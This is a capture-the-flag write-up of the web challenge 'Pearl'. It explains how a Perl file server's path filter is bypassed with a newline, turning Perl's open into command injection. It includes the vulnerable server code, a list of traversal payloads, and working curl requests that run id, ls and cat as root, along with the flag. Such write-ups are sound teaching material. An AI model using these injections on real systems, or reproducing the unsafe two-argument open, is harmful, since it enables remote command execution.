---
title: Pearl
summary: I used perl to make my pearl shop.
tags: [ImaginaryCTF, Web, Command Injection]
date: 2025-09-07
showtoc: true
---

# Pearl

## Description

I used perl to make my pearl shop.
Soon, we will expand to selling [Perler bead](https://en.wikipedia.org/wiki/Fuse_beads) renditions of [Perlin noise](https://en.wikipedia.org/wiki/Perlin_noise).

Author: Eth007

[Given files](/imaginaryctf/pearl/pearl.zip)

## Solution

The web application is a static HTML page where we can add products to our cart.
That's it.

![index](/imaginaryctf/pearl/index.png)

Let's look at the provided source code.

Firstly, the flag is located in a file on the server.
The filename is composed of the MD5 hash of the flag itself, so we don't know its exact name.

```Dockerfile
COPY flag.txt /
RUN mv /flag.txt /flag-$(md5sum /flag.txt | awk '{print $1}').txt
```

The server is written in Perl (you could have guessed?) and serves either the contents of a file or a directory listing based on the request path.

```perl
if ($r->method eq 'GET') {
    my $path = CGI::unescape($r->uri->path);
    $path =~ s|^/||;     # Remove leading slash
    $path ||= 'index.html';

    my $fullpath = File::Spec->catfile("./files", $path);

    if ($fullpath =~ /\.\.|[,\`\)\(;&]|\|.*\|/) {
        $c->send_error(RC_BAD_REQUEST, "Invalid path");
        next;
    }

    if (-d $fullpath) {
        # Serve directory listing
        opendir(my $dh, $fullpath) or do {
            $c->send_error(RC_FORBIDDEN, "Cannot open directory.");
            next;
        };

        my @files = readdir($dh);
        closedir($dh);

        my $html = "<html><body><h1>Index of /$path</h1><ul>";
        foreach my $f (@files) {
            next if $f =~ /^\./;  # Skip dotfiles
            my $link = "$path/$f";
            $link =~ s|//|/|g;
            $html .= qq{<li><a href="/$link">} . escapeHTML($f) . "</a></li>";
        }
        $html .= "</ul></body></html>";

        my $resp = HTTP::Response->new(RC_OK);
        $resp->header("Content-Type" => "text/html");
        $resp->content($html);
        $c->send_response($resp);
    } else {
        open(my $fh, $fullpath) or do {
            $c->send_error(RC_INTERNAL_SERVER_ERROR, "Cannot open file.");
            next;
        };
        binmode $fh;
        my $content = do { local $/; <$fh> };
        close $fh;

        my $mime = 'text/html';

        my $resp = HTTP::Response->new(RC_OK);
        $resp->header("Content-Type" => $mime);
        $resp->content($content);
        $c->send_response($resp);
    }
}
```

To exploit this server, my idea was to send two requests:

* The first one would list the files in the root directory using path traversal to discover the flag filename, using something like `localhost:8080/../../`.
* The second one would retrieve the contents of the file containing the flag using `localhost:8080/../../flag-[md5sum].txt`.

Let’s see how the path is sanitized:

```perl
my $path = CGI::unescape($r->uri->path);
$path =~ s|^/||;     # Remove leading slash
$path ||= 'index.html';

my $fullpath = File::Spec->catfile("./files", $path);

if ($fullpath =~ /\.\.|[,\`\)\(;&]|\|.*\|/) {
    $c->send_error(RC_BAD_REQUEST, "Invalid path");
    next;
}
```

The path is first decoded from URL encoding, then concatenated to `./files`, and the result must not match the given regex.

To better understand the regex, I used [Regex101](https://regex101.com/).

![regex](/imaginaryctf/pearl/regex.png)

So the regex prevents the path from containing:

* `..`: the classic path traversal sequence
* Any of these characters: `,`, `` ` ``, `)`, `(`, `;`, `&`
* `|.*|`: a pipe, followed by anything, followed by another pipe

To leak the contents of the root directory, I tried various payloads:

* Basic path traversal: `/..`
* URL-encoded traversal: `/%2E%2E`
* Double URL-encoded: `/%252E%252E`
* Overlong UTF-8 encoding: `/%c0%2e%c0%2e`
* Using special characters to avoid regex detection: `/.%00.`
* And many more...

But none worked.

Since path traversal was my only idea and all my attempts failed, I did some research.

It turns out that in Perl, the `open` function can not only read files but also execute shell commands.
That's why subshell characters are sanitized.

So again, I tried various command injections:

* Subshells like `/$(id)` and `` /`id` `` are caught by the regex
* A single pipe like `/|id` is treated as a filename
* Two pipes (`/|id|`) are blocked by the regex `|.*|`

But then I remembered the regex description from [Regex101](https://regex101.com/):

![regex_pipe](/imaginaryctf/pearl/regex_pipe.png)

> `.` matches any character (**except for line terminators**)

So what if I put a newline before the second pipe, like this: `|id\n|`?

Answer: **It works!**

```sh
$ curl 'http://localhost:8080/|id%0a|'
uid=0(root) gid=0(root) groups=0(root)
```

All that's left is to find the flag and read it.

```sh
$ curl 'http://localhost:8080/|ls%20/%0a|'
app
bin
boot
dev
etc
flag-8ede8d4419fba13690098d0df565f495.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var

$ curl 'http://localhost:8080/|cat%20/flag-8ede8d4419fba13690098d0df565f495.txt%0a|'
ictf{uggh_why_do_people_use_perl_1f023b129a22}
```

# References

- Perl Documentation: [open](https://perldoc.perl.org/functions/open)
